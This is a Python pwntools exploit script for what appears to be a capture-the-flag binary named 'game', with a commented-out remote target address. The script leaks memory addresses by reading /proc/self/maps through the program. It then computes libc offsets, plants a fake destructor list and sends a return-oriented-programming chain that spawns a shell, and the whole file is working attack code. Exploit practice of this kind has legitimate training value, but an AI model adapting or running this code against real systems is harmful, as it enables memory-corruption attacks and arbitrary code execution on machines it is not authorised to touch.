# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

p = process("./game")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
#p = remote("111.198.29.45",32108)
gdb.attach(p)

# 1.get addr
p.recvuntil('Y/n')
p.sendline('y')
p.recvuntil('Exit\n')
p.sendline('1')
p.recvuntil('finding?')
p.sendline('/proc/self/maps')
p.recvuntil('Exit\n')
p.sendline('3')
p.recvuntil('get?')
p.sendline('10000')
p.recvuntil('You get something:\n')
textAddr = int(p.recvuntil("-")[:-1],16)
log.success("textAddr:"+hex(textAddr))
p.recvuntil('\n')
p.recvuntil('\n')
dataAddr = int(p.recvuntil("-")[:-1],16)
log.success("dataAddr:"+hex(dataAddr))
p.recvuntil('\n')
p.recvuntil('\n')
stackBase = int(p.recvuntil("-")[:-1],16)
log.success("stackBase:"+hex(stackBase))
p.recvuntil('\n')
libcBase = int(p.recvuntil("-")[:-1],16)
log.success("libcBase:"+hex(libcBase))
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
mapBase = int(p.recvuntil("-")[:-1],16)
log.success("ldBase:"+hex(mapBase))
addr_dtor_list=mapBase+0x6f0

freeHook = libcBase + 0x3c67a8
oneGadget = libcBase + 0x45216
binsh = libcBase + libc.search("/bin/sh").next()

pop_r8 = libcBase + 0x135136
add_esp_0xa8 = libcBase + 0x36cfd
fake_dtor_list=p64(addr_dtor_list+8) +p64(add_esp_0xa8)+p64(binsh)+p64(0)+p64(0x6666)
#hijack_write_max='./house'.ljust(0x8,"\x00") +p64(pop_r8)+p64(0x123123)+p64(addr_dtor_list)
hijack_write_max='/proc/self/maps'.ljust(0x18,'\x00')+p64(addr_dtor_list)
p.recvuntil('Exit\n')
p.sendline('1')
p.recvuntil('finding?')
p.sendline(hijack_write_max)
p.recvuntil('Exit\n')
p.sendline("4")
p.recvuntil("content: \n")
p.sendline(fake_dtor_list)

pop_rbp = libcBase + 0x7db72
addr_buf = dataAddr + 0x50
leave_ret = libcBase + 0x42351
hijack_write_max='./house'.ljust(0x8,"\x00") +p64(pop_rbp)+p64(pop_rbp)+p64(addr_buf)+p64(leave_ret)
p.recvuntil('Exit\n')
pause()
p.sendline('1')
p.recvuntil('finding?')
p.sendline(hijack_write_max)

p.interactive()
